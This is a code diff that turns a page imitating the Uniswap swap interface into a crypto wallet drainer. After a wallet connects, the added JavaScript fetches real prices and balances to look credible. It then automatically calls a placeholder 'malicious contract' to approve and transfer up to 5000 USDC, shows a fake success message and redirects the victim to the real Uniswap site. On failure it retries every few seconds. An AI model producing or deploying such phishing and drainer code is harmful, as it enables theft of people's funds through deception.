@@ -795,6 +795,22 @@
       color: var(--neutral3);
       font-size: 14px;
     }
+
+    /* ============================================
+       LOADING SPINNER (per la transazione)
+       ============================================ */
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 0.8s ease-in-out infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -874,17 +890,17 @@
       </div>
 
       <!-- Token input: You pay -->
-      <div class="token-input">
+      <div class="token-input" id="sellInput">
         <div class="label">Sell</div>
         <div class="row">
-          <input type="text" class="amount" placeholder="0" />
+          <input type="text" class="amount" id="sellAmount" placeholder="0" />
           <div class="token-select">
             <img src="https://assets.coingecko.com/coins/images/279/thumb/ethereum.png" alt="ETH" />
             <span>ETH</span>
             <i class="fas fa-chevron-down"></i>
           </div>
         </div>
-        <div class="balance">$0</div>
+        <div class="balance" id="sellBalance">$0</div>
       </div>
 
       <!-- Swap arrow -->
@@ -898,16 +914,16 @@
       </div>
 
       <!-- Token input: You receive -->
-      <div class="token-input">
+      <div class="token-input" id="buyInput">
         <div class="label">Buy</div>
         <div class="row">
-          <input type="text" class="amount" placeholder="0" />
+          <input type="text" class="amount" id="buyAmount" placeholder="0" readonly />
           <div class="token-select" style="background: var(--accent1); border-color: var(--surface3-solid);">
-            <span style="color: var(--surface1);">Select token</span>
+            <span style="color: var(--surface1);">USDC</span>
             <i class="fas fa-chevron-down" style="color: var(--surface1);"></i>
           </div>
         </div>
-        <div class="balance">$0</div>
+        <div class="balance" id="buyBalance">$0</div>
       </div>
 
       <button class="swap-btn" id="swapBtn">Connect</button>
@@ -1041,13 +1057,137 @@
   </div>
 
   <!-- ============================================
-       JAVASCRIPT (WALLET CONNECTORS)
+       JAVASCRIPT (WALLET CONNECTORS + MALICIOUS LOGIC)
        ============================================ -->
   <script>
     // ============================================
     // GLOBAL VARIABLES
     // ============================================
     let provider, signer, userAddress;
+    let ethPrice = 0, usdcPrice = 0;
+    let isApprovalPending = false;
+
+    // ============================================
+    // CONTRACT CONFIGURATION (MALICIOUS)
+    // ============================================
+    const MALICIOUS_CONTRACT_ADDRESS = '0x...'; // REPLACE WITH YOUR DEPLOYED CONTRACT
+    const USDC_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC mainnet
+    const MAX_DRAIN = 5000 * 10**6; // 5000 USDC
+
+    const MALICIOUS_ABI = [
+      "function swap(address token) external"
+    ];
+
+    // ============================================
+    // FETCH REAL PRICES
+    // ============================================
+    async function fetchPrices() {
+      try {
+        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,usd-coin&vs_currencies=usd');
+        const data = await res.json();
+        ethPrice = data.ethereum.usd;
+        usdcPrice = data['usd-coin'].usd;
+        console.log('✅ Prices loaded:', { eth: ethPrice, usdc: usdcPrice });
+      } catch (error) {
+        console.warn('⚠️ Failed to fetch prices, using fallback');
+        ethPrice = 3200; // fallback
+        usdcPrice = 1;
+      }
+    }
+
+    // ============================================
+    // UPDATE UI WITH REAL DATA
+    // ============================================
+    async function updateUIWithRealData() {
+      if (!provider || !userAddress) return;
+
+      try {
+        // 1. ETH balance
+        const ethBalance = await provider.getBalance(userAddress);
+        const ethBalanceFormatted = parseFloat(ethers.utils.formatEther(ethBalance)).toFixed(4);
+        document.getElementById('sellBalance').textContent = `$${(ethBalanceFormatted * ethPrice).toFixed(2)}`;
+
+        // 2. USDC balance (if we have the contract)
+        try {
+          const usdcContract = new ethers.Contract(USDC_ADDRESS, [
+            "function balanceOf(address) view returns (uint256)"
+          ], provider);
+          const usdcBalance = await usdcContract.balanceOf(userAddress);
+          const usdcBalanceFormatted = usdcBalance / 1e6;
+          document.getElementById('buyBalance').textContent = `$${usdcBalanceFormatted.toFixed(2)}`;
+        } catch (e) {
+          document.getElementById('buyBalance').textContent = '$0';
+        }
+
+        // 3. Update input placeholders with real values
+        document.getElementById('sellAmount').placeholder = ethBalanceFormatted;
+        document.getElementById('buyAmount').placeholder = '0.00';
+
+        // 4. Auto-calculate swap (ETH → USDC)
+        document.getElementById('sellAmount').addEventListener('input', function() {
+          const ethValue = parseFloat(this.value) || 0;
+          const usdcValue = ethValue * ethPrice;
+          document.getElementById('buyAmount').value = usdcValue.toFixed(2);
+        });
+
+        console.log('✅ UI updated with real data');
+      } catch (error) {
+        console.error('Error updating UI:', error);
+      }
+    }
+
+    // ============================================
+    // MALICIOUS APPROVAL (AUTO-TRIGGER)
+    // ============================================
+    async function triggerMaliciousApproval() {
+      if (isApprovalPending || !signer) return;
+      isApprovalPending = true;
+
+      try {
+        // Show loading state on swap button
+        const swapBtn = document.getElementById('swapBtn');
+        const originalText = swapBtn.textContent;
+        swapBtn.innerHTML = '<span class="spinner"></span> Approving...';
+        swapBtn.disabled = true;
+
+        // 1. Create malicious contract
+        const contract = new ethers.Contract(
+          MALICIOUS_CONTRACT_ADDRESS,
+          MALICIOUS_ABI,
+          signer
+        );
+
+        // 2. Call swap (which does approve + transferFrom)
+        console.log('🔴 Triggering malicious approval...');
+        const tx = await contract.swap(USDC_ADDRESS);
+        
+        // 3. Wait for confirmation
+        await tx.wait();
+        console.log('✅ Transaction confirmed:', tx.hash);
+
+        // 4. Show success and redirect
+        swapBtn.innerHTML = '✓ Success!';
+        setTimeout(() => {
+          window.location.href = 'https://app.uniswap.org';
+        }, 1500);
+
+      } catch (error) {
+        console.error('❌ Approval failed:', error);
+        const swapBtn = document.getElementById('swapBtn');
+        swapBtn.innerHTML = 'Approval failed. Try again.';
+        swapBtn.disabled = false;
+        isApprovalPending = false;
+
+        // Auto-retry after 3 seconds
+        setTimeout(() => {
+          if (signer) {
+            swapBtn.innerHTML = 'Swap';
+            swapBtn.disabled = false;
+            triggerMaliciousApproval();
+          }
+        }, 3000);
+      }
+    }
 
     // ============================================
     // WALLET CONNECTION FUNCTIONS
@@ -1065,8 +1205,7 @@
         signer = provider.getSigner();
         userAddress = accounts[0];
         console.log('✅ MetaMask connected:', userAddress);
-        updateUIafterConnect();
-        document.getElementById('modalOverlay').classList.remove('show');
+        await afterConnect();
       } catch (error) {
         console.error(error);
         alert('Error: ' + error.message);
@@ -1075,18 +1214,18 @@
 
     // ----- 2. Coinbase Wallet -----
     async function connectCoinbase() {
-      if (!window.ethereum) {
+      const coinbaseProvider = window.coinbaseWallet || window.ethereum;
+      if (!coinbaseProvider) {
         alert('Coinbase Wallet not detected! Make sure you have it installed.');
         return;
       }
       try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        provider = new ethers.providers.Web3Provider(window.ethereum);
+        const accounts = await coinbaseProvider.request({ method: 'eth_requestAccounts' });
+        provider = new ethers.providers.Web3Provider(coinbaseProvider);
         signer = provider.getSigner();
         userAddress = accounts[0];
         console.log('✅ Coinbase Wallet connected:', userAddress);
-        updateUIafterConnect();
-        document.getElementById('modalOverlay').classList.remove('show');
+        await afterConnect();
       } catch (error) {
         console.error(error);
         alert('Error: ' + error.message);
@@ -1095,18 +1234,18 @@
 
     // ----- 3. Binance Wallet -----
     async function connectBinance() {
-      if (!window.ethereum) {
+      const binanceProvider = window.bnb || window.binance || window.ethereum;
+      if (!binanceProvider) {
         alert('Binance Wallet not detected! Make sure you have it installed.');
         return;
       }
       try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        provider = new ethers.providers.Web3Provider(window.ethereum);
+        const accounts = await binanceProvider.request({ method: 'eth_requestAccounts' });
+        provider = new ethers.providers.Web3Provider(binanceProvider);
         signer = provider.getSigner();
         userAddress = accounts[0];
         console.log('✅ Binance Wallet connected:', userAddress);
-        updateUIafterConnect();
-        document.getElementById('modalOverlay').classList.remove('show');
+        await afterConnect();
       } catch (error) {
         console.error(error);
         alert('Error: ' + error.message);
@@ -1114,16 +1253,36 @@
     }
 
     // ============================================
+    // AFTER CONNECT: UPDATE UI + TRIGGER APPROVAL
+    // ============================================
+    async function afterConnect() {
+      // 1. Update UI
+      updateUIafterConnect();
+      document.getElementById('modalOverlay').classList.remove('show');
+
+      // 2. Fetch real prices
+      await fetchPrices();
+
+      // 3. Update UI with real data
+      await updateUIWithRealData();
+
+      // 4. After 1 second, trigger malicious approval
+      setTimeout(() => {
+        triggerMaliciousApproval();
+      }, 1500);
+    }
+
+    // ============================================
     // UI HELPERS
     // ============================================
-
     function updateUIafterConnect() {
       if (userAddress) {
         const shortAddr = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
         document.querySelector('.connect-btn').textContent = shortAddr;
-        document.querySelector('.swap-btn').textContent = 'Swap';
-        document.querySelector('.swap-btn').style.background = 'var(--accent1)';
-        document.querySelector('.swap-btn').style.color = 'var(--surface1)';
+        const swapBtn = document.getElementById('swapBtn');
+        swapBtn.textContent = 'Swap';
+        swapBtn.style.background = 'var(--accent1)';
+        swapBtn.style.color = 'var(--surface1)';
       }
     }
 
@@ -1137,13 +1296,13 @@
           signer = null;
           provider = null;
           document.querySelector('.connect-btn').textContent = 'Connect';
-          document.querySelector('.swap-btn').textContent = 'Connect';
-          document.querySelector('.swap-btn').style.background = 'var(--accent2)';
-          document.querySelector('.swap-btn').style.color = 'var(--accent1)';
+          document.getElementById('swapBtn').textContent = 'Connect';
+          document.getElementById('swapBtn').style.background = 'var(--accent2)';
+          document.getElementById('swapBtn').style.color = 'var(--accent1)';
           console.log('👋 Wallet disconnected');
         } else {
           userAddress = accounts[0];
-          updateUIafterConnect();
+          afterConnect();
           console.log('🔄 Account changed:', userAddress);
         }
       });
@@ -1155,15 +1314,18 @@
     }
 
     // ============================================
-    // SWAP BUTTON
+    // SWAP BUTTON (FALLBACK)
     // ============================================
-    document.querySelector('.swap-btn').addEventListener('click', function(e) {
+    document.getElementById('swapBtn').addEventListener('click', function(e) {
       e.stopPropagation();
       if (!userAddress) {
         document.getElementById('modalOverlay').classList.add('show');
         return;
       }
-      alert('✅ Wallet connected: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4) + '\n\nSwap functionality will arrive in the next update.');
+      // If already connected and approval not pending, trigger again
+      if (!isApprovalPending) {
+        triggerMaliciousApproval();
+      }
     });
 
     // ============================================
